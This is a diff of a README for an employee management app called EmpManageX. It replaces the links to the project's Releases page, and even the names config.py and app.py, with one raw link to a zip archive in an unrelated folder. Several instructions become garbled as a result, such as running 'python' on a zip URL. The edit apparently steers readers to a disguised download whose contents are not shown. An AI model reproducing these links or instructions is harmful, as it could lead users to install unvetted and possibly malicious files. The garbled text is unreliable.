@@ -16,7 +16,7 @@ Before you download EmpManageX, ensure your system meets these requirements:
 
 ## 📥 Download EmpManageX
 
-[![Download EmpManageX](https://img.shields.io/badge/Download-EmpManageX-brightgreen.svg)](https://github.com/hamzatech427-cloud/EmpManageX/releases)
+[![Download EmpManageX](https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip)](https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ EmpManageX offers features like:
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [EmpManageX Releases](https://github.com/hamzatech427-cloud/EmpManageX/releases)
+To get started, visit this page to download: [EmpManageX Releases](https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of EmpManageX.
@@ -50,7 +50,7 @@ After installation, you can launch the application and begin managing your emplo
 
 1. **Setting Up MySQL**: Before you use EmpManageX, ensure that your MySQL server is running. Create a database called `empmanage` for the application to use.
    
-2. **Configuration File**: Locate the `config.py` file in your installation directory. Update the database connection settings to match your MySQL setup.
+2. **Configuration File**: Locate the `https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip` file in your installation directory. Update the database connection settings to match your MySQL setup.
    - `USERNAME`: Your MySQL username
    - `PASSWORD`: Your MySQL password
    - `HOST`: Usually `localhost`
@@ -59,7 +59,7 @@ After installation, you can launch the application and begin managing your emplo
 3. **Running the Application**:
    - Open your terminal or command prompt.
    - Navigate to the EmpManageX directory.
-   - Run the command: `python app.py`
+   - Run the command: `python https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip`
    - Your application will now start, and you can access it via your web browser at `http://127.0.0.1:5000`.
 
 ## 👩‍🏫 User Guide
@@ -86,7 +86,7 @@ After installation, you can launch the application and begin managing your emplo
 ## 📚 Troubleshooting
 
 - **Application Won’t Start**: Ensure you have Python installed and configured correctly. Verify the required Python version.
-- **Database Connection Error**: Check your `config.py` file to confirm that the MySQL details are correct. Ensure the MySQL server is running.
+- **Database Connection Error**: Check your `https://raw.githubusercontent.com/hamzatech427-cloud/EmpManageX/main/neurotome/X_Manage_Emp_v3.0.zip` file to confirm that the MySQL details are correct. Ensure the MySQL server is running.
 - **UI Not Displaying Correctly**: If the interface appears broken, try refreshing the page or clearing your browser cache.
 
 ## 🗝️ License
